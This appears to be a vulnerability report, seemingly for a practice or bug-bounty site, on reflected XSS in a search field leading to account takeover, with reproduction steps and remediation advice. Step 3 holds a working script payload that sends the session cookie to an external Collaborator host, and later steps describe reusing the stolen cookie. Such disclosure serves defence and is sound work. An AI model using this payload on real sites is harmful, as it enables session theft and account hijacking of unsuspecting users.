## Title
Reflected XSS to Account Takeover
<!-- Write a short, clear title describing the vulnerability and where it was found. Example: Stored XSS in User Profile -->

## Description
**Affected URL:** https://pixeleet.pwnedbox.site/
<!-- Explain what the vulnerability is, where it exists, and why it is a security issue. Include the affected URL or endpoint. -->
The search functionality executes injected JavaScript in the user's browser. The proof of concept shows that the PHPSESSID cookie is accessible to JavaScript and can be sent to an external server, allowing the session to be reused.
## Steps to Reproduce
<!-- Provide clear, numbered steps so another person can reproduce the issue. Include required requests, parameters, and actions. -->
1. Visit https://pixeleet.pwnedbox.site/ and click **Join**.
2. Register and sign in to a test account.
3. Enter the following payload in the search field and submit it:
   ```html
   '"><script>document.write(`<img src=https://zy1p23olh9sqv6wrdmcc8x1zjqphd71w.oastify.com/${document.cookie}>`)</script>
   ```
4. Check Burp Collaborator for an HTTP interaction containing the test account's `PHPSESSID` in the request path.
5. Set the captured `PHPSESSID` cookie for `pixeleet.pwnedbox.site` in a separate browser and refresh the site. The test account is displayed.

## POC (Proof of Concept)
<!-- Add screenshots, HTTP requests/responses, payloads, or videos that demonstrate the vulnerability. -->
1. The first screenshot shows the Pixeleet homepage and **Join** button.

<img width="1920" height="969" alt="1" src="https://github.com/user-attachments/assets/b09d6e8b-6051-406b-9d6d-00623b25a78f" />

2. The second screenshot shows the test account registration form.

<img width="1920" height="968" alt="2" src="https://github.com/user-attachments/assets/ede01339-0932-4e03-8cc9-f34f2b09f49a" />

3. The third screenshot shows the payload entered in the search field while signed in.

<img width="1920" height="966" alt="3" src="https://github.com/user-attachments/assets/d0144795-ae45-4b53-8227-fc74f87d967a" />

4. The fourth screenshot shows Burp Collaborator receiving an HTTP request containing the PHPSESSID.

<img width="1920" height="1020" alt="4" src="https://github.com/user-attachments/assets/c2cc09ba-08d3-43a0-b3cd-981dd996fb41" />

5. The fifth screenshot shows the captured session cookie set in a separate browser.

<img width="1920" height="971" alt="5" src="https://github.com/user-attachments/assets/4f279d38-a2f4-446e-afcf-87d5008666d4" />

6.The sixth screenshot shows the test account accessed using that session cookie.

<img width="1920" height="964" alt="6" src="https://github.com/user-attachments/assets/d6c65cd8-51f1-446a-804a-35d0a5572100" />

## Impact
<!-- Explain what an attacker could achieve, who could be affected, and the realistic security consequences. -->
An attacker who causes a victim to execute the payload could steal a JavaScript-accessible session cookie and reuse it to access the victim's account. The screenshots demonstrate session reuse against the test account.
## Remediation
<!-- Suggest specific steps to fix the vulnerability. Include secure coding practices or configuration changes where appropriate. -->
1. Apply context-appropriate output encoding to search input before rendering it.
2. Avoid inserting untrusted input into HTML using unsafe APIs such as `document.write`.
3. Set session cookies with `HttpOnly`, `Secure`, and an appropriate `SameSite` attribute.
4. Implement a restrictive Content Security Policy as defense in depth.
5. Invalidate exposed sessions and rotate session identifiers.
